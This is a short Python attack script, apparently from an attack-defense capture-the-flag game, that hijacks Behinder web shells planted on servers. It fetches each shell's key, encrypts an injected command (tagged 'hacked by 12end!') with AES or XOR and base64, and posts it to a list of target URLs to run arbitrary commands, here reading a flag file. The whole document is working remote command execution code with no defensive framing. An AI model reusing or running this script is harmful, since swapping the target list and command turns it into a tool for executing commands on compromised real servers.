import requests
def Behinder_aes_enc(command, key):
    import os

    command = "|echo \\'hacked by 12end!\\';" + command
    str = "php -r \"echo @openssl_encrypt('%s', 'AES128', '%s');\"" % (command, key)
    try:
        str = os.popen(str).readline()
    except:
        str = ""
    return str


def Behinder_b64_enc(command, key):
    import base64, urllib

    command = "|echo 'hacked by 12end!';" + command + "//"
    str = ""
    for i in range(0, len(command)):
        str += chr(ord(command[i])^ord(key[((i + 1) & 15)]))
    str = base64.b64encode(str.encode("utf-8")).decode()
    str = urllib.parse.quote(str)
    #print(str)
    return str


def Behinder_exec(url, command):

    sess = requests.session()
    key = sess.get(url + "?pass", timeout=3).text
    str = Behinder_aes_enc(command, key)
    result = sess.post(url, json=str).text
    if "12end" not in result:
        str = Behinder_b64_enc(command, key)
        result = sess.post(url, json=str, timeout=3).text
    sess.close()
    return result


def fuck_allBehinder(urls, command):
    for url in urls:
        Behinder_exec(url, command)


if __name__ == "__main__":
    urls = ["http://192.168.1.20/core/config/routing.php"]
    command = "cat /var/www/html/flag"
    fuck_allBehinder(urls, command)